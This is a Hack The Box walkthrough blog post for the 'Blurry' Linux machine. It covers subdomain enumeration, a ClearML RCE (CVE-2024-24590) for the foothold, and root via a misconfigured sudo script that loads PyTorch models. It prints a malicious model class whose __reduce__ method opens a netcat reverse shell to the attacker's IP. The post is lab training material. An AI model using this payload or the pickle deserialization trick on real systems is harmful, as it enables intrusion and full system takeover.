---
title: "Blurry Walkthrough(Hack The Box)"
date: 2025-04-05
draft: false
description: "a description"
tags: ["Medium", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
---

## About
Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning. The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite. The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities (`[CVE-2024-24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590)` - `[CVE-2024-24595](https://nvd.nist.gov/vuln/detail/CVE-2024-24595)`) that can be chained together for remote code execution. Once a shell on the target is obtained, a program that can be run with `sudo` is discovered. The program loads arbitrary `PyTorch` models to evaluate them against a protected dataset. While it is known that such models are susceptible to insecure deserialisation, `fickling` is used to scan the dataset for insecure `pickle` files , prior to loading the model. Malicious code can be injected into a model, using `runpy` to bypass the `fickling` checks.

## Reconnaissance 
- Initial Nmap scan revealed **two open ports**.
![Pasted image 20241230011755.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230011755.png?raw=true)
- Browsing to the IP led me to a **main web application hosted at** `app.blurry.htb`. 
- At this point, I added `blurry.htb` and `app.blurry.htb` to my `/etc/hosts` file for easy access.  

## Enumeration
- Through further inspection of the application and some basic fuzzing/DNS enumeration, I discovered **multiple subdomains**:  
  - `files.blurry.htb`  
  - `app.blurry.htb`  
  - `chat.blurry.htb`  
  - `api.blurry.htb`  
![Pasted image 20241230012112.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230012112.png?raw=true)
- The `chat` subdomain contained a messaging system where I found **announcements and internal discussions** that revealed the app under `app.blurry.htb` was built using **ClearML**.  
- This detail turned out to be crucial during exploitation.  
![crucial](https://media.tenor.com/DrQJZb8JvoQAAAAj/its-kinda-important-eric-cartman.gif)

## Exploitation
- Based on my enumeration, I looked into known vulnerabilities for ClearML and came across a **Remote Code Execution (RCE) exploit: `CVE-2024-24590`**.  
- The exploit allowed arbitrary code execution via manipulated task scheduling in the ClearML system.  
- Followed the PoC steps from a GitHub repo:
  - Set up and triggered a ClearML task on the host  
  - Executed the RCE payload
![Followed](https://media1.tenor.com/m/5xhyv6ICia8AAAAC/legends-of-the-fall-all-the-rules.gif)
- Successfully gained a **reverse shell** as the `blurry` user.
![Pasted image 20241230012804.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230012804.png?raw=true)
- Also got the {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20241230022137.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230022137.png?raw=true)

## Privilege Escalation
- Checked for potential privesc vectors and found a **sudo permission** allowing execution of a script that loads and verifies `.pth` model files.
![Pasted image 20241230031047.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230031047.png?raw=true)
- The script used **PyTorch** to load models, creating an opportunity for exploitation via the `__reduce__` method in a custom model class.  
- I crafted a malicious PyTorch model that, when deserialized by the script, would trigger a **reverse shell as root**.  
- Learned about this technique from a detailed blog post on ML model deserialization attacks. 

```python
import torch  
import torch.nn as nn  
import os  
  
class MaliciousModel(nn.Module):  
    def __init__(self):  
        super(MaliciousModel, self).__init__()  
        self.dense = nn.Linear(10, 1)  
      
    def forward(self, pk):  
        return self.dense(pk)  
     
    def __reduce__(self):  
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 9001 >/tmp/f"  
        return os.system, (cmd,)  
  
malicious_model = MaliciousModel()  
torch.save(malicious_model, 'pk2212.pth')
```
- Used sudo to run the verification script with this model
![Pasted image 20241230031501.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230031501.png?raw=true)
- Got a root shell back to my listener and captured the {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20241230031533.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241230031533.png?raw=true)

## Summary
- Target: Linux machine hosting a ClearML-based app.

- Recon revealed key subdomains and led us to ClearML.

- Used known CVE-2024-24590 to exploit the ClearML service and gain a foothold.

- Escalated privileges to root via a malicious PyTorch model deserialization attack, leveraging a misconfigured sudo script.

- Successfully retrieved both user and root flags.

{{< typeit >}} I hope you enjoyed my walkthrough if yes kindly share this with your connections. So until next time byee...... {{< /typeit >}}
![end](https://media.giphy.com/media/7DzlajZNY5D0I/giphy.gif?cid=ecf05e4795scc63iio2egfh13waslmf6buv3kdg985s97vkv&ep=v1_gifs_search&rid=giphy.gif&ct=g)
